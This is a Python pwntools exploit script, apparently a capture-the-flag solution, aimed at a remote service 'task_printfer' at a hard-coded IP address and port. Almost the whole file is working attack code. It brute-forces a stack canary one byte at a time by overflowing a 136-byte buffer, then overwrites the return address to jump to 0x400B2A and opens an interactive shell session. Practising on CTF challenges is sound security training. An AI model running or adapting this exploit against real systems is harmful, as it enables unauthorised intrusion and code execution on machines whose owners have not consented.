#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template task_printfer '--port=11589' '--host=109.233.56.90'
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('task_printfer')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11589)

# def start_local(argv=[], *a, **kw):
#     '''Execute the target binary locally'''
#     if args.GDB:
#         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def bruteCanary():
    canary = b""
    while len(canary) < 8:
        for i in range(256):
            current_byte = i.to_bytes(1, "big")

            io = start()
            io.recvuntil(b"Length of data: \x00")

            pl = cyclic(136)
            pl += canary
            pl += current_byte

            io.sendline( str(len(pl)).encode() )
            io.send(pl)

            status = b""
            try:
                status = io.recvuntil(b"Bye!\x00")
            except EOFError:
                pass
                # print("Process Died")
            finally:
                io.close()

            if "Bye!" in status.decode():
                canary += current_byte
                # print(hexdump(canary))
                break

    return canary

canary = bruteCanary()

io = start()
io.recvuntil(b"Length of data: \x00")

pl = cyclic(136)
pl += canary
pl += p64(0xdead)
pl += p64(0x400B2A)

io.sendline( str(len(pl)).encode() )
io.send(pl)

io.interactive()

